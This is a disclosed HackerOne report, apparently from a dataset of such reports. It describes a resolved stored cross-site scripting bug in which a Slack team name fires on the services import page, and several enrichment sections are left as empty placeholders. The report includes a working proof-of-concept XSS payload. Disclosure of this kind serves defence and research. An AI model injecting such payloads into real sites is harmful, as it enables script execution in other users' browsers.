---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '33018'
original_report_id: '33018'
title: a stored xss in  slack integration  https://onerror.slack.com/services/import
weakness: Cross-site Scripting (XSS) - Generic
team_handle: slack
created_at: '2014-10-28T08:32:59.537Z'
disclosed_at: '2016-05-22T15:07:38.785Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# a stored xss in  slack integration  https://onerror.slack.com/services/import

## Metadata

- HackerOne Report ID: 33018
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: slack
- Disclosed At: 2016-05-22T15:07:38.785Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

location of the stored xss bug :
https://hunter22.slack.com/admin/name
in team name :put this payload :"><img src=x onerror=prompt(document.domain)>

stored xss executed here:
https://hunter22.slack.com/services/import

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
